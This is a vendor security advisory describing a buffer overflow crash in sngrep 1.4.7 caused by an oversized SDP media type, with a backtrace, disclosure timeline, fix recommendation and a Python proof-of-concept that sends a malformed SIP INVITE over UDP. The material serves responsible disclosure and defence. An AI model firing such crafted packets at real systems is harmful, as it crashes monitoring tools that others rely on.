# sngrep crashes due to a buffer overflow caused by a malformed SDP media type

- Fixed versions: 1.4.8
- Enable Security Advisory: <https://github.com/EnableSecurity/advisories/tree/master/ES2020-03-sngrep-malformed-media-type>
- Tested vulnerable versions: 1.4.7
- Timeline:
    - Report date: 2020-09-16
    - sngrep confirmed issue + patch: 2020-09-16
    - sngrep release with fix: 2020-11-10
    - Enable Security advisory: 2020-11-20

## Description

When sending a specially crafted SIP message with a malformed SDP media type, `sngrep` crashes due to a buffer overflow. The following backtrace was generated during our tests:

```
#0  __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:50
#1  0x00007ffff7ced859 in __GI_abort () at abort.c:79
#2  0x00007ffff7d583ee in __libc_message (action=action@entry=do_abort, 
    fmt=fmt@entry=0x7ffff7e8207c "*** %s ***: terminated\n")
    at ../sysdeps/posix/libc_fatal.c:155
#3  0x00007ffff7dfa9ba in __GI___fortify_fail (
    msg=msg@entry=0x7ffff7e82012 "buffer overflow detected") at fortify_fail.c:26
#4  0x00007ffff7df9256 in __GI___chk_fail () at chk_fail.c:28
#5  0x00007ffff7df8b36 in __strcpy_chk (dest=0x7ffff00306f2 "", 
    src=0x7ffff79fcad1 'A' <repeats 200 times>..., destlen=destlen@entry=15)
    at strcpy_chk.c:30
#6  0x0000555555563f72 in strcpy (__src=<optimized out>, __dest=<optimized out>)
    at /usr/include/x86_64-linux-gnu/bits/string_fortified.h:90
#7  media_set_type (media=<optimized out>, type=<optimized out>) at media.c:65
#8  0x0000000000000000 in ?? ()
```

The issue was originally discovered during [OpenSIPIt](https://opensipit.org/); tracked down and analyzed for severity and impact later.

## Impact

Since most modern build systems will automatically include run-time best practice checks, it is highly unlikely that this issue is exploited in a way that it overwrites to adjacent memory locations. However, due to how fortify protection works, the program will still end up crashing. Nonetheless, this issue should not be dismissed by relying on build system protections and should be adequately fixed.

## How to reproduce the issue

1. Run `sngrep`
1. Execute the below python program
1. Notice that `sngrep` has crashed

```python
import socket

sdp="v=0\r\n" + \
    "o=- 1600157102 1600157102 IN IP4 127.0.0.1\r\n" + \
    "s=-\r\n" + \
    "c=IN IP4 127.0.0.1\r\n" + \
    "t=0 0\r\n" + \
    "m=%s 9999 RTP/AVP 8 0 96 101\r\n" % ('A' * 1024) + \
    "a=rtpmap:8 PCMA/8000/1\r\n" + \
    "a=rtpmap:0 PCMU/8000/1\r\n" + \
    "a=rtpmap:96 opus/96000/2\r\n" + \
    "a=rtpmap:101 telephone-event/8000/1\r\n" + \
    "a=sendrecv"

sip_msg="INVITE sip:bob_1@127.0.0.1:5060 SIP/2.0\r\n" + \
    "Via: SIP/2.0/UDP 127.0.0.1:40111;rport;branch=z9hG4bK-a\r\n" + \
    "Max-Forwards: 70\r\n" + \
    "From: <sip:bob_1@127.0.0.1:5060>;tag=3Ewqeuo81F1Hjvtg\r\n" + \
    "To: <sip:bob_1@127.0.0.1:5060>\r\n" + \
    "Call-ID: maooZ4nDzmArTBkT\r\n" + \
    "CSeq: 1020 INVITE\r\n" + \
    "Contact: <sip:bob_1@127.0.0.1:40111;transport=udp>\r\n" + \
    "Content-Length: %i\r\n" % len(sdp) + \
    "Content-Type: application/sdp\r\n" + \
    "\r\n" + \
    sdp

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(sip_msg.encode(), ("127.0.0.1", 5060))
```


## Solutions and recommendations

It is recommended that the length of the string passed to function `media_set_type` in `media.c` is checked against `MEDIATYPELEN`, which is of length 15.

## About Enable Security

[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.

## Disclosure policy

This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.

